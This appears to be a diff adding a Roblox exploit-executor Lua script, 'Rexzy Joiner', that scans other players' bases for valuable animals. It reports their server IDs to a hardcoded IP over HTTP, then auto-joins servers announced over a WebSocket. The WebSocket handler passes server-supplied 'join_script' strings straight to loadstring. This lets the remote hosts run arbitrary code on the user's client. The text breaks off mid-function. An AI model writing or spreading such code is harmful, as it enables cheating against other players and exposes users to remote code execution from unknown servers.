@@ -1,0 +1,996 @@
+local player = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+getgenv().RexzyJoinerState = getgenv().RexzyJoinerState or {}
+local state = getgenv().RexzyJoinerState
+
+local function notify(text)
+    pcall(function()
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Rexzy System",
+            Text = text,
+            Duration = 3
+        })
+    end)
+end
+
+local function getHWID()
+    local hwid = "unknown_hwid"
+    pcall(function()
+        hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    return hwid
+end
+
+local function initializeScript()
+    if state.ws then
+        pcall(function() state.ws:Close() end)
+        state.ws = nil
+    end
+    
+    if (state.screenGui and state.screenGui.Parent) then
+        state.screenGui:Destroy()
+        state.screenGui = nil
+    end
+    
+    if state.userBaseHighlight then
+        pcall(function() state.userBaseHighlight:Destroy() end)
+        state.userBaseHighlight = nil
+    end
+    
+    loadMainScript()
+end
+
+function loadMainScript()
+    getgenv().webhook = "http://144.172.110.44:5000/send"
+    
+    local Players = game:GetService("Players")
+    local Workspace = game:GetService("Workspace")
+    local HttpService = game:GetService("HttpService")
+    local LocalPlayer = Players.LocalPlayer
+    
+    local lastSentText, lastSentValue = nil, -1
+    local receivedLogs = {}
+    local maxLogs = 5
+    local logsVisible = false
+    local logsFrame = nil
+    local logsContainer = nil
+    local Active = true
+    
+    local function parseGeneration(text)
+        if (not text or (text == "")) then
+            return 0
+        end
+        
+        text = tostring(text):gsub(",", ""):gsub("%$", ""):match("^%s*(.-)%s*$") or text
+        if text:match("/[sS]") then
+            text = text:gsub("/[sS]", "")
+        end
+        
+        local minPart, secPart = text:match("^(%d+)%s*[mM]%s+(%d+)%s*[sS]$")
+        if not minPart then
+            minPart, secPart = text:match("^(%d+)[mM](%d+)[sS]$")
+        end
+        
+        if minPart then
+            local minutes = tonumber(minPart) or 0
+            local seconds = tonumber(secPart) or 0
+            return (minutes * 60) + seconds
+        end
+        
+        local onlySec = text:match("^(%d+)%s*[sS]$")
+        if (onlySec and not text:match("[kKmMbB]")) then
+            return tonumber(onlySec) or 0
+        end
+        
+        local numStr, suf = text:match("([%d%.]+)%s*([kKmMbB]?)")
+        local val = tonumber(numStr) or 0
+        
+        if (suf and (suf ~= "")) then
+            local lower = suf:lower()
+            if (lower == "k") then
+                val = val * 1000
+            elseif (lower == "m") then
+                val = val * 1000000
+            elseif (lower == "b") then
+                val = val * 1000000000
+            end
+        end
+        
+        return val
+    end
+    
+    local function formatValue(amount)
+        if (type(amount) ~= "number") then
+            return tostring(amount)
+        end
+        
+        if (amount >= 999999995904) then
+            return string.format("%.2fT", amount / 999999995904)
+        elseif (amount >= 1000000000) then
+            return string.format("%.2fB", amount / 1000000000)
+        elseif (amount >= 1000000) then
+            return string.format("%.2fM", amount / 1000000)
+        elseif (amount >= 1000) then
+            return string.format("%.2fK", amount / 1000)
+        else
+            return tostring(amount)
+        end
+    end
+    
+    local function buildJoinLink(placeId, jobId)
+        return string.format(
+            "https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s",
+            tonumber(placeId) or game.PlaceId,
+            tostring(jobId or game.JobId)
+        )
+    end
+    
+    local function buildJoinScript(placeId, jobId)
+        return string.format(
+            "`game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)`",
+            tonumber(placeId) or game.PlaceId,
+            tostring(jobId or game.JobId)
+        )
+    end
+    
+    local function sendWebhookAnimal(genText, genValue, jobId)
+        local currentPlayers = #Players:GetPlayers()
+        local maxPlayers = Players.MaxPlayers or 0
+        
+        if ((maxPlayers > 0) and (currentPlayers >= maxPlayers)) then
+            return
+        end
+        
+        local joinLink = buildJoinLink(game.PlaceId, jobId or game.JobId)
+        local joinScript = buildJoinScript(game.PlaceId, jobId or game.JobId)
+        
+        local embed = {
+            title = "🐾 Highest Animal Found!",
+            description = string.format(
+                "**Generation:** %s\n**Value:** %s\n\n➡️ **📎 Join Link:** [Click here](%s)\n➡️ **📜 Join Script (PC):** %s",
+                tostring(genText),
+                formatValue(genValue),
+                joinLink,
+                joinScript
+            ),
+            color = 16711680,
+            fields = {
+                {
+                    name = "Players",
+                    value = string.format("%d/%d", currentPlayers, maxPlayers),
+                    inline = true
+                },
+                {
+                    name = "Job ID",
+                    value = tostring(jobId or game.JobId),
+                    inline = true
+                }
+            },
+            footer = {text = "Rexzy Notifier"},
+            timestamp = (DateTime and DateTime.now and DateTime.now():ToIsoDate()) or ""
+        }
+        
+        local payload = {
+            username = "Notifier",
+            embeds = {embed}
+        }
+        
+        local jsonData = HttpService:JSONEncode(payload)
+        local req = http_request or request or (syn and syn.request) or (http and http.request)
+        
+        if not req then
+            return
+        end
+        
+        pcall(function()
+            req({
+                Url = getgenv().webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = jsonData
+            })
+        end)
+    end
+    
+    local function highlightUserBase()
+        if state.userBaseHighlight then
+            pcall(function() state.userBaseHighlight:Destroy() end)
+            state.userBaseHighlight = nil
+        end
+        
+        local plots = Workspace:FindFirstChild("Plots")
+        if not plots then
+            return
+        end
+        
+        for _, plot in pairs(plots:GetChildren()) do
+            if plot:IsA("Model") then
+                for _, desc in pairs(plot:GetDescendants()) do
+                    if (desc:IsA("TextLabel") and (desc.Text == (((LocalPlayer and LocalPlayer.Name) or "") .. "'s Base"))) then
+                        local highlight = Instance.new("Highlight")
+                        highlight.Adornee = plot
+                        highlight.FillColor = Color3.fromRGB(255, 0, 0)
+                        highlight.FillTransparency = 0.7
+                        highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
+                        highlight.OutlineTransparency = 0
+                        highlight.Parent = plot
+                        state.userBaseHighlight = highlight
+                        return
+                    end
+                end
+            end
+        end
+    end
+    
+    task.spawn(function()
+        local threshold = 1000000
+        local scanInterval = 5
+        local currentHighestValue = -1
+        local currentHighestPart = nil
+        
+        highlightUserBase()
+        
+        while Active do
+            local plots = Workspace:FindFirstChild("Plots")
+            if plots then
+                local validAnimals = {}
+                
+                for _, plot in pairs(plots:GetChildren()) do
+                    if plot:IsA("Model") then
+                        local isOwn = false
+                        
+                        for _, desc in pairs(plot:GetDescendants()) do
+                            if (desc:IsA("TextLabel") and (desc.Text == (((LocalPlayer and LocalPlayer.Name) or "") .. "'s Base"))) then
+                                isOwn = true
+                                break
+                            end
+                        end
+                        
+                        if not isOwn then
+                            local animalPodiums = plot:FindFirstChild("AnimalPodiums")
+                            if animalPodiums then
+                                for _, podium in pairs(animalPodiums:GetChildren()) do
+                                    local basePart = podium:FindFirstChild("Base", true)
+                                    local spawn = basePart and basePart:FindFirstChild("Spawn", true)
+                                    local attach = spawn and spawn:FindFirstChild("Attachment", true)
+                                    local overhead = attach and attach:FindFirstChild("AnimalOverhead", true)
+                                    local gen = overhead and overhead:FindFirstChild("Generation")
+                                    
+                                    if (basePart and gen and gen:IsA("TextLabel")) then
+                                        local genText = gen.Text
+                                        if string.find(genText, "%$") then
+                                            local val = parseGeneration(genText)
+                                            table.insert(validAnimals, {text = genText, value = val, part = basePart})
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                table.sort(validAnimals, function(a, b)
+                    return a.value > b.value
+                end)
+                
+                if (#validAnimals > 0) then
+                    local highest = validAnimals[1]
+                    if ((highest.value > currentHighestValue) or (currentHighestPart ~= highest.part)) then
+                        currentHighestValue = highest.value
+                        currentHighestPart = highest.part
+                        
+                        if ((highest.value >= threshold) and ((highest.text ~= lastSentText) or (highest.value ~= lastSentValue))) then
+                            sendWebhookAnimal(highest.text, highest.value, game.JobId)
+                            lastSentText, lastSentValue = highest.text, highest.value
+                        end
+                    end
+                else
+                    currentHighestValue = -1
+                    currentHighestPart = nil
+                end
+                
+                if (not state.userBaseHighlight or not state.userBaseHighlight.Parent) then
+                    highlightUserBase()
+                end
+            end
+            
+            if Active then
+                task.wait(scanInterval)
+            end
+        end
+    end)
+    
+    local function isDuplicateLog(scriptStr)
+        for _, log in ipairs(receivedLogs) do
+            if (log.script == scriptStr) then
+                return true
+            end
+        end
+        return false
+    end
+    
+    local function addLogEntry(value, joinScript)
+        if isDuplicateLog(joinScript) then
+            print("[Rexzy Joiner] Duplicate log entry detected, not adding to UI log.")
+            return
+        end
+        
+        table.insert(receivedLogs, 1, {value = value, script = joinScript, time = os.time()})
+        
+        if (#receivedLogs > maxLogs) then
+            table.remove(receivedLogs)
+        end
+        
+        if (logsVisible and logsFrame) then
+            updateLogsDisplay()
+        end
+    end
+    
+    function updateLogsDisplay()
+        if not logsFrame then
+            return
+        end
+        
+        for _, child in pairs(logsFrame:GetChildren()) do
+            if (child:IsA("TextButton") and (child.Name == "LogButton")) then
+                child:Destroy()
+            end
+        end
+        
+        task.wait(0.01)
+        
+        for i, log in ipairs(receivedLogs) do
+            local logBtn = Instance.new("TextButton")
+            logBtn.Name = "LogButton"
+            logBtn.Size = UDim2.new(1, -20, 0, 50)
+            logBtn.Position = UDim2.new(0, 10, 0, 10 + ((i - 1) * 55))
+            logBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+            logBtn.TextColor3 = Color3.new(1, 1, 1)
+            logBtn.Font = Enum.Font.GothamBold
+            logBtn.TextSize = 16
+            logBtn.Text = log.value .. " - JOIN"
+            logBtn.Parent = logsFrame
+            
+            Instance.new("UICorner", logBtn).CornerRadius = UDim.new(0, 8)
+            
+            logBtn.MouseButton1Click:Connect(function()
+                local func, err = loadstring(log.script)
+                if func then
+                    pcall(func)
+                else
+                    warn("Script error: " .. tostring(err))
+                end
+            end)
+            
+            logBtn.MouseEnter:Connect(function()
+                logBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+            end)
+            
+            logBtn.MouseLeave:Connect(function()
+                logBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+            end)
+        end
+        
+        logsFrame.CanvasSize = UDim2.new(0, 0, 0, (#receivedLogs * 55) + 10)
+    end
+    
+    local function showSplashOnce(callback)
+        local flagFile = "rexzy_first_run.flag"
+        
+        if (isfile and isfile(flagFile)) then
+            callback()
+            return
+        end
+        
+        local SplashGui = Instance.new("ScreenGui")
+        SplashGui.Name = "SplashScreen"
+        SplashGui.IgnoreGuiInset = true
+        SplashGui.Parent = game:GetService("CoreGui")
+        
+        local BlackFrame = Instance.new("Frame")
+        BlackFrame.Size = UDim2.new(1, 0, 1, 0)
+        BlackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+        BlackFrame.BorderSizePixel = 0
+        BlackFrame.Parent = SplashGui
+        
+        local ScamLabel = Instance.new("TextLabel")
+        ScamLabel.Size = UDim2.new(1, 0, 0, 50)
+        ScamLabel.Position = UDim2.new(0, 0, 0.05, 0)
+        ScamLabel.BackgroundTransparency = 1
+        ScamLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        ScamLabel.Font = Enum.Font.GothamBold
+        ScamLabel.TextSize = 22
+        ScamLabel.Text = "If you paid for this, you got scammed"
+        ScamLabel.Parent = BlackFrame
+        
+        local TitleLabel = Instance.new("TextLabel")
+        TitleLabel.Size = UDim2.new(1, 0, 0, 70)
+        TitleLabel.Position = UDim2.new(0, 0, 0.4, 0)
+        TitleLabel.BackgroundTransparency = 1
+        TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TitleLabel.Font = Enum.Font.GothamBlack
+        TitleLabel.TextSize = 36
+        TitleLabel.Text = "Rexzy Joiner"
+        TitleLabel.Parent = BlackFrame
+        
+        local DiscordLabel = Instance.new("TextLabel")
+        DiscordLabel.Size = UDim2.new(1, 0, 0, 40)
+        DiscordLabel.Position = UDim2.new(0, 0, 0.55, 0)
+        DiscordLabel.BackgroundTransparency = 1
+        DiscordLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+        DiscordLabel.Font = Enum.Font.GothamBold
+        DiscordLabel.TextSize = 20
+        DiscordLabel.Text = "discord.gg/joiner"
+        DiscordLabel.Parent = BlackFrame
+        
+        local CountdownLabel = Instance.new("TextLabel")
+        CountdownLabel.Size = UDim2.new(1, 0, 0, 40)
+        CountdownLabel.Position = UDim2.new(0, 0, 0.9, 0)
+        CountdownLabel.BackgroundTransparency = 1
+        CountdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CountdownLabel.Font = Enum.Font.Gotham
+        CountdownLabel.TextSize = 18
+        CountdownLabel.Text = "This will disappear in 10"
+        CountdownLabel.Parent = BlackFrame
+        
+        task.spawn(function()
+            for i = 10, 1, -1 do
+                CountdownLabel.Text = "This will disappear in " .. i
+                if not Active then
+                    break
+                end
+                task.wait(1)
+            end
+            
+            SplashGui:Destroy()
+            if writefile then
+                pcall(function()
+                    writefile(flagFile, "true")
+                end)
+            end
+            callback()
+        end)
+    end
+    
+    local function startJoiner()
+        local AutoJoinEnabled = false
+        local MinMS = 2
+        local ServerRegion = "USA"
+        local AutoLoadScript = true
+        
+        state.screenGui = Instance.new("ScreenGui")
+        state.screenGui.Name = "JoinerUI"
+        state.screenGui.ResetOnSpawn = false
+        state.screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        
+        local screenGui = state.screenGui
+        
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(0, 280, 0, 90)
+        frame.Position = UDim2.new(0.5, -140, 0, 0)
+        frame.BackgroundTransparency = 1
+        frame.Parent = screenGui
+        
+        local outline = Instance.new("TextLabel")
+        outline.Text = "1-999 joiner | discord.gg/joiner"
+        outline.Font = Enum.Font.SourceSansBold
+        outline.TextSize = 26
+        outline.TextColor3 = Color3.new(0, 0, 0)
+        outline.Position = UDim2.new(0, 2, 0, 2)
+        outline.Size = UDim2.new(1, 0, 0, 35)
+        outline.BackgroundTransparency = 1
+        outline.ZIndex = 0
+        outline.Parent = frame
+        
+        local mainText = outline:Clone()
+        mainText.ZIndex = 1
+        mainText.TextColor3 = Color3.new(1, 1, 1)
+        mainText.Position = UDim2.new(0, 0, 0, 0)
+        mainText.Parent = frame
+        
+        local startButton = Instance.new("TextButton")
+        startButton.Text = "Start"
+        startButton.Font = Enum.Font.SourceSans
+        startButton.TextSize = 18
+        startButton.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+        startButton.TextColor3 = Color3.new(1, 1, 1)
+        startButton.Size = UDim2.new(0.4, 0, 0, 25)
+        startButton.Position = UDim2.new(0, 8, 0, 40)
+        startButton.Parent = frame
+        Instance.new("UICorner", startButton).CornerRadius = UDim.new(0, 8)
+        
+        local settingsButton = Instance.new("TextButton")
+        settingsButton.Text = "Settings"
+        settingsButton.Font = Enum.Font.SourceSans
+        settingsButton.TextSize = 18
+        settingsButton.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+        settingsButton.TextColor3 = Color3.new(1, 1, 1)
+        settingsButton.Size = UDim2.new(0.4, 0, 0, 25)
+        settingsButton.Position = UDim2.new(0.55, -8, 0, 40)
+        settingsButton.Parent = frame
+        Instance.new("UICorner", settingsButton).CornerRadius = UDim.new(0, 8)
+        
+        local statsLabel = Instance.new("TextLabel")
+        statsLabel.Name = "StatsLabel"
+        statsLabel.Size = UDim2.new(1, 0, 0, 20)
+        statsLabel.Position = UDim2.new(0, 0, 0, 70)
+        statsLabel.BackgroundTransparency = 1
+        statsLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+        statsLabel.Font = Enum.Font.Gotham
+        statsLabel.TextSize = 12
+        statsLabel.Text = "Users (Online): Loading..."
+        statsLabel.Parent = frame
+        
+        local function hoverEffect(btn)
+            btn.MouseEnter:Connect(function()
+                if Active then
+                    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+                end
+            end)
+            
+            btn.MouseLeave:Connect(function()
+                if not Active then
+                    return
+                end
+                if ((btn == startButton) and AutoJoinEnabled) then
+                    btn.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
+                else
+                    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+                end
+            end)
+        end
+        
+        hoverEffect(startButton)
+        hoverEffect(settingsButton)
+        
+        local hwid = getHWID()
+        local cfgFile = "autojoin_" .. hwid .. ".json"
+        
+        local function loadConfig()
+            if (isfile and isfile(cfgFile)) then
+                local ok, data = pcall(function()
+                    return HttpService:JSONDecode(readfile(cfgFile))
+                end)
+                if (ok and (type(data) == "table")) then
+                    if data.MinMS then
+                        MinMS = data.MinMS
+                    end
+                    if data.ServerRegion then
+                        ServerRegion = data.ServerRegion
+                    end
+                    if (data.AutoJoin ~= nil) then
+                        AutoJoinEnabled = data.AutoJoin
+                    end
+                    if (data.AutoLoadScript ~= nil) then
+                        AutoLoadScript = data.AutoLoadScript
+                    end
+                end
+            end
+        end
+        
+        local function saveConfig()
+            if writefile then
+                pcall(function()
+                    writefile(cfgFile, HttpService:JSONEncode({
+                        MinMS = MinMS,
+                        ServerRegion = ServerRegion,
+                        AutoJoin = AutoJoinEnabled,
+                        AutoLoadScript = AutoLoadScript
+                    }))
+                end)
+            end
+        end
+        
+        loadConfig()
+        
+        local shouldStartJoiner = AutoLoadScript and AutoJoinEnabled
+        if not AutoLoadScript then
+            AutoJoinEnabled = false
+        end
+        
+        local popup
+        local settingsBox
+        
+        local function createLogsContainer()
+            if (logsContainer and logsContainer.Parent) then
+                return
+            end
+            if not popup then
+                return
+            end
+            
+            logsContainer = Instance.new("Frame")
+            logsContainer.Size = UDim2.new(0, 350, 0, 250)
+            logsContainer.Position = UDim2.new(0.5, -175, 0.5, -125)
+            logsContainer.AnchorPoint = Vector2.new(0.5, 0.5)
+            logsContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+            logsContainer.Active = true
+            logsContainer.Draggable = true
+            logsContainer.Parent = popup
+            Instance.new("UICorner", logsContainer).CornerRadius = UDim.new(0, 10)
+            
+            local logsTitle = Instance.new("TextLabel", logsContainer)
+            logsTitle.Size = UDim2.new(1, 0, 0, 30)
+            logsTitle.Position = UDim2.new(0, 0, 0, 6)
+            logsTitle.BackgroundTransparency = 1
+            logsTitle.TextColor3 = Color3.new(1, 1, 1)
+            logsTitle.Font = Enum.Font.GothamBold
+            logsTitle.TextSize = 16
+            logsTitle.Text = "Recent Logs"
+            
+            local scrollFrame = Instance.new("ScrollingFrame", logsContainer)
+            scrollFrame.Size = UDim2.new(1, -20, 1, -50)
+            scrollFrame.Position = UDim2.new(0, 10, 0, 40)
+            scrollFrame.BackgroundTransparency = 1
+            scrollFrame.ScrollBarThickness = 8
+            scrollFrame.CanvasSize = UDim2.new(0, 0, 0, maxLogs * 55)
+            scrollFrame.BorderSizePixel = 0
+            logsFrame = scrollFrame
+            
+            updateLogsDisplay()
+        end
+        
+        local function openSettings()
+            if not popup then
+                popup = Instance.new("ScreenGui")
+                popup.Parent = game:GetService("CoreGui")
+            end
+            
+            if settingsBox then
+                settingsBox:Destroy()
+            end
+            
+            settingsBox = Instance.new("Frame")
+            settingsBox.Size = UDim2.new(0, 380, 0, 380)
+            settingsBox.Position = UDim2.new(0.5, -190, 0.5, -190)
+            settingsBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+            settingsBox.Active = true
+            settingsBox.Draggable = true
+            settingsBox.Parent = popup
+            Instance.new("UICorner", settingsBox).CornerRadius = UDim.new(0, 12)
+            
+            local settingsTitle = Instance.new("TextLabel", settingsBox)
+            settingsTitle.Size = UDim2.new(1, 0, 0, 40)
+            settingsTitle.BackgroundTransparency = 1
+            settingsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+            settingsTitle.Font = Enum.Font.GothamBold
+            settingsTitle.TextSize = 20
+            settingsTitle.Text = "Settings"
+            
+            local inputLabel = Instance.new("TextLabel", settingsBox)
+            inputLabel.Size = UDim2.new(1, -30, 0, 20)
+            inputLabel.Position = UDim2.new(0, 15, 0, 50)
+            inputLabel.BackgroundTransparency = 1
+            inputLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            inputLabel.Font = Enum.Font.Gotham
+            inputLabel.TextSize = 14
+            inputLabel.Text = "Minimum M/S"
+            inputLabel.TextXAlignment = Enum.TextXAlignment.Left
+            
+            local input = Instance.new("TextBox", settingsBox)
+            input.Size = UDim2.new(1, -30, 0, 35)
+            input.Position = UDim2.new(0, 15, 0, 75)
+            input.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
+            input.TextColor3 = Color3.new(1, 1, 1)
+            input.Font = Enum.Font.Gotham
+            input.TextSize = 16
+            input.Text = tostring(MinMS)
+            input.ClearTextOnFocus = false
+            Instance.new("UICorner", input).CornerRadius = UDim.new(0, 8)
+            
+            local autoloadToggle = Instance.new("TextButton", settingsBox)
+            autoloadToggle.Size = UDim2.new(1, -30, 0, 35)
+            autoloadToggle.Position = UDim2.new(0, 15, 0, 120)
+            autoloadToggle.BackgroundColor3 = (AutoLoadScript and Color3.fromRGB(70, 160, 70)) or Color3.fromRGB(45, 45, 60)
+            autoloadToggle.TextColor3 = Color3.new(1, 1, 1)
+            autoloadToggle.Font = Enum.Font.GothamBold
+            autoloadToggle.TextSize = 14
+            autoloadToggle.Text = "Auto-start Script: " .. ((AutoLoadScript and "ON") or "OFF")
+            Instance.new("UICorner", autoloadToggle).CornerRadius = UDim.new(0, 8)
+            
+            local logsToggle = Instance.new("TextButton", settingsBox)
+            logsToggle.Size = UDim2.new(1, -30, 0, 35)
+            logsToggle.Position = UDim2.new(0, 15, 0, 165)
+            logsToggle.BackgroundColor3 = (logsVisible and Color3.fromRGB(70, 160, 70)) or Color3.fromRGB(45, 45, 60)
+            logsToggle.TextColor3 = Color3.new(1, 1, 1)
+            logsToggle.Font = Enum.Font.GothamBold
+            logsToggle.TextSize = 14
+            logsToggle.Text = "View Logs: " .. ((logsVisible and "ON") or "OFF")
+            Instance.new("UICorner", logsToggle).CornerRadius = UDim.new(0, 8)
+            
+            local serverLabel = Instance.new("TextLabel", settingsBox)
+            serverLabel.Size = UDim2.new(1, -30, 0, 20)
+            serverLabel.Position = UDim2.new(0, 15, 0, 210)
+            serverLabel.BackgroundTransparency = 1
+            serverLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+            serverLabel.Font = Enum.Font.Gotham
+            serverLabel.TextSize = 14
+            serverLabel.Text = "Server Region"
+            serverLabel.TextXAlignment = Enum.TextXAlignment.Left
+            
+            local usaButton = Instance.new("TextButton", settingsBox)
+            usaButton.Size = UDim2.new(0, 170, 0, 35)
+            usaButton.Position = UDim2.new(0, 15, 0, 235)
+            usaButton.BackgroundColor3 = ((ServerRegion == "USA") and Color3.fromRGB(70, 160, 70)) or Color3.fromRGB(45, 45, 60)
+            usaButton.TextColor3 = Color3.new(1, 1, 1)
+            usaButton.Font = Enum.Font.GothamBold
+            usaButton.TextSize = 14
+            usaButton.Text = "USA"
+            Instance.new("UICorner", usaButton).CornerRadius = UDim.new(0, 8)
+            
+            local europeButton = Instance.new("TextButton", settingsBox)
+            europeButton.Size = UDim2.new(0, 165, 0, 35)
+            europeButton.Position = UDim2.new(0, 195, 0, 235)
+            europeButton.BackgroundColor3 = ((ServerRegion == "EUROPE") and Color3.fromRGB(70, 160, 70)) or Color3.fromRGB(45, 45, 60)
+            europeButton.TextColor3 = Color3.new(1, 1, 1)
+            europeButton.Font = Enum.Font.GothamBold
+            europeButton.TextSize = 14
+            europeButton.Text = "EUROPE"
+            Instance.new("UICorner", europeButton).CornerRadius = UDim.new(0, 8)
+            
+            local save = Instance.new("TextButton", settingsBox)
+            save.Size = UDim2.new(1, -30, 0, 40)
+            save.Position = UDim2.new(0, 15, 0, 330)
+            save.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
+            save.TextColor3 = Color3.new(1, 1, 1)
+            save.Font = Enum.Font.GothamBold
+            save.TextSize = 16
+            save.Text = "Save"
+            Instance.new("UICorner", save).CornerRadius = UDim.new(0, 8)
+            
+            autoloadToggle.MouseButton1Click:Connect(function()
+                AutoLoadScript = not AutoLoadScript
+                autoloadToggle.BackgroundColor3 = (AutoLoadScript and Color3.fromRGB(70, 160, 70)) or Color3.fromRGB(45, 45, 60)
+                autoloadToggle.Text = "Auto-start Script: " .. ((AutoLoadScript and "ON") or "OFF")
+            end)
+            
+            logsToggle.MouseButton1Click:Connect(function()
+                logsVisible = not logsVisible
+                logsToggle.BackgroundColor3 = (logsVisible and Color3.fromRGB(70, 160, 70)) or Color3.fromRGB(45, 45, 60)
+                logsToggle.Text = "View Logs: " .. ((logsVisible and "ON") or "OFF")
+                if logsVisible then
+                    createLogsContainer()
+                elseif (logsContainer and logsContainer.Parent) then
+                    logsContainer.Parent = nil
+                end
+            end)
+            
+            usaButton.MouseButton1Click:Connect(function()
+                ServerRegion = "USA"
+                usaButton.BackgroundColor3 = Color3.fromRGB(70, 160, 70)
+                europeButton.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
+            end)
+            
+            europeButton.MouseButton1Click:Connect(function()
+                ServerRegion = "EUROPE"
+                europeButton.BackgroundColor3 = Color3.fromRGB(70, 160, 70)
+                usaButton.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
+            end)
+            
+            save.MouseButton1Click:Connect(function()
+                local v = tonumber(input.Text)
+                if v then
+                    MinMS = math.clamp(v, 0, 1000000)
+                end
+                saveConfig()
+                settingsBox:Destroy()
+            end)
+            
+            if logsVisible then
+                createLogsContainer()
+            elseif logsContainer then
+                logsContainer.Parent = nil
+            end
+        end
+        
+        settingsButton.MouseButton1Click:Connect(openSettings)
+        
+        local function startAutoJoin()
+            if not WebSocket then
+                warn("Executor lacks WebSocket support.")
+                return
+            end
+            
+            if state.ws then
+                pcall(function() state.ws:Close() end)
+                state.ws = nil
+            end
+            
+            local wsUrl = ((ServerRegion == "EUROPE") and "ws://104.194.156.27:8766") or "ws://144.172.110.44:8766"
+            local ok, socket = pcall(function()
+                return WebSocket.connect(wsUrl)
+            end)
+            
+            if (not ok or not socket) then
+                warn("WebSocket connection failed")
+                return
+            end
+            
+            state.ws = socket
+            print("[Rexzy Joiner] WebSocket connected to " .. ServerRegion .. " server")
+            
+            local function parseMoney(str)
+                if not str then
+                    return 0
+                end
+                str = str:gsub("%*%*", ""):gsub("`", ""):match("^%s*(.-)%s*$") or str
+                local num, suf = str:match("([%d%.]+)%s*([kKmM]?)")
+                local n = tonumber(num)
+                if not n then
+                    return 0
+                end
+                if suf then
+                    suf = suf:lower()
+                    if (suf == "k") then
+                        n = n * 1000
+                    elseif (suf == "m") then
+                        n = n * 1000000
+                    end
+                end
+                return n
+            end
+            
+            local function extractJobIdFromScript(scriptStr)
+                local jobId = scriptStr:match('TeleportToPlaceInstance%s*%(.*,%s*[\'\"]([^\'\"]+)[\'\"]')
+                return jobId
+            end
+            
+            state.ws.OnMessage:Connect(function(msg)
+                if (not Active or not AutoJoinEnabled) then
+                    return
+                end
+                
+                print("[Rexzy Joiner] Received raw message: " .. tostring(msg))
+                
+                local ok, data = pcall(function()
+                    return HttpService:JSONDecode(msg)
+                end)
+                
+                if (not ok or (type(data) ~= "table")) then
+                    print("[Rexzy Joiner] Error parsing message: " .. tostring(msg))
+                    return
+                end
+                
+                if (data.value and data.join_script) then
+                    local valNum = parseMoney(data.value)
+                    local scriptStr = data.join_script:gsub("%*%*", ""):gsub("`", ""):match("^%s*(.-)%s*$") or data.join_script
+                    local targetJobId = extractJobIdFromScript(scriptStr)
+                    local currentJobId = game.JobId
+                    
+                    if (targetJobId and (targetJobId == currentJobId)) then
+                        print("Skipping - same server (Job ID: " .. targetJobId .. ")")
+                        return
+                    end
+                    
+                    if (valNum >= (MinMS * 1000000)) then
+                        print("Joining server with value: " .. data.value)
+                        addLogEntry(data.value, scriptStr)
+                        
+                        local func, err = loadstring(scriptStr)
+                        if func then
+                            pcall(func)
+                        else
+                            warn("Script error: " .. tostring(err))
+                        end
+                    else
+                        print("Not joining (below threshold: " .. formatValue(valNum) .. ")")
+                    end
+                end
+            end)
+            
+            state.ws.OnClose:Connect(function()
+                print("[Rexzy Joiner] WebSocket closed. Auto-reconnect will attempt a new connection.")
+                state.ws = nil
+            end)
+        end
+        
+        task.spawn(function()
+            while Active do
+                task.wait(1)
+                if AutoJoinEnabled then
+                    if not state.ws then
+                        print("[Rexzy Joiner] WebSocket disconnected, attempting reconnect...")
+                        task.wait(2)
+                        startAutoJoin()
+                    end
+                end
+            end
+        end)
+        
+        startButton.MouseButton1Click:Connect(function()
+            if not Active then
+                return
+            end
+            
+            AutoJoinEnabled = not AutoJoinEnabled
+            startButton.Text = (AutoJoinEnabled and "Stop") or "Start"
+            startButton.BackgroundColor3 = (AutoJoinEnabled and Color3.fromRGB(60, 150, 60)) or Color3.fromRGB(45, 45, 65)
+            
+            saveConfig()
+            
+            if AutoJoinEnabled then
+                print("[Rexzy Joiner] Starting Auto-Join.")
+            elseif state.ws then
+                print("[Rexzy Joiner] Stopping Auto-Join. Closing WebSocket.")
+                pcall(function() state.ws:Close() end)
+                state.ws = nil
+            end
+        end)
+        
+        if shouldStartJoiner then
+            startButton.Text = "Stop"
+            startButton.BackgroundColor3 = Color3.fromRGB(60, 150, 60)
+            task.spawn(function()
+                task.wait(0.1)
+                print("[Rexzy Joiner] Auto-Join started based on Auto-Load Script setting and previous state.")
+                startAutoJoin()
+            end)
+        else
+            startButton.Text = "Start"
+            startButton.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+            if ((AutoLoadScript == false) and (AutoJoinEnabled == true)) then
+                print("[Rexzy Joiner] Auto-Join disabled on load due to 'Auto-Load Script' setting.")
+            end
+        end
+        
+        task.spawn(function()
+            local req = http_request or request or (syn and syn.request)
+            if not req then
+                statsLabel.Text = "HTTP Not Supported"
+                return
+            end
+            
+            while Active and frame.Parent do
+                local usaCount = "?"
+                local euCount = "?"
+                
+                pcall(function()
+                    local resp = req({Url = "http://104.194.156.27:6969/api/stats", Method = "GET"})
